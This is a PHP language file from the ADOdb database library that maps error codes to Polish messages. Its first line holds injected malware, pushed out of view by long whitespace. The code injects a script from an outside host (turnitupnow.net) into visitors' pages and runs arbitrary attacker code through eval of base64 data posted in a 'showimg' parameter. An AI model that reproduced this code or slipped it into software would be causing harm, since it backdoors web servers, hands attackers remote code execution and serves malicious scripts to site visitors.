<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


// Contributed by Grzegorz Pacan <gp#dione.cc>

$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'pl',
            DB_ERROR                    => 'niezidentyfikowany b³±d',
            DB_ERROR_ALREADY_EXISTS     => 'ju¿ istniej±',
            DB_ERROR_CANNOT_CREATE      => 'nie mo¿na stworzyæ',
            DB_ERROR_CANNOT_DELETE      => 'nie mo¿na usun±æ',
            DB_ERROR_CANNOT_DROP        => 'nie mo¿na porzuciæ',
            DB_ERROR_CONSTRAINT         => 'pogwa³cenie uprawnieñ',
            DB_ERROR_DIVZERO            => 'dzielenie przez zero',
            DB_ERROR_INVALID            => 'b³êdny',
            DB_ERROR_INVALID_DATE       => 'b³êdna godzina lub data',
            DB_ERROR_INVALID_NUMBER     => 'b³êdny numer',
            DB_ERROR_MISMATCH           => 'niedopasowanie',
            DB_ERROR_NODBSELECTED       => 'baza danych nie zosta³a wybrana',
            DB_ERROR_NOSUCHFIELD        => 'nie znaleziono pola',
            DB_ERROR_NOSUCHTABLE        => 'nie znaleziono tabeli',
            DB_ERROR_NOT_CAPABLE        => 'nie zdolny',
            DB_ERROR_NOT_FOUND          => 'nie znaleziono',
            DB_ERROR_NOT_LOCKED         => 'nie zakmniêty',
            DB_ERROR_SYNTAX             => 'b³±d sk³adni',
            DB_ERROR_UNSUPPORTED        => 'nie obs³uguje',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'warto¶æ liczona w szeregu',
            DB_ERROR_INVALID_DSN        => 'b³êdny DSN',
            DB_ERROR_CONNECT_FAILED     => 'po³±czenie nie zosta³o zrealizowane',
            0	                       => 'brak b³êdów', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'niedostateczna ilo¶æ informacji',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'nie znaleziono rozszerzenia',
            DB_ERROR_NOSUCHDB           => 'nie znaleziono bazy',
            DB_ERROR_ACCESS_VIOLATION   => 'niedostateczne uprawnienia'
);
?>